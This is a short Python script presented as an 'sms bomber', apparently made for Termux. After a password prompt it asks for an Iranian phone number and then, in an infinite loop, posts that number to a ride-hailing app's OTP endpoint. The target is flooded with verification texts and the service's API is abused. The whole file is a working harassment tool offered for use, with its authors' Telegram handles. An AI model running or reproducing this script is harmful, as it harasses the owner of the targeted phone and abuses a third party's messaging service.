import requests
import os
red='\033[31m'
green='\033[32m'
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
os.system("pkg install figlet -y ")
os.system("clear")
joker = input(f"{red}Enter liens : ")
if joker == "mr joooon":
    os.system("clear")
    os.system("figlet sms bomber")
    print(f"{green}===========================================")
    print("         made by bad_boy or m.r joooon     ")
    print(" my telegramid:@Bad_boy_468 or @jokerkinger ")
    print(" my telegram channel: @bad_hack1            ")
    print(f"{green}===========================================")
    print("[1]start")
    print("[2]exit")
    king = int(input("[~]Bad_boy==>"))
    if king == 1:
        hacker = input("Enter phone Number : ")
        while True:
            requests.post(url,data={"cellphone":"+98"+hacker})
            print("sended to =>", hacker)
    elif king == 2:
         os.system("clear")
         print("have nice day =) ")
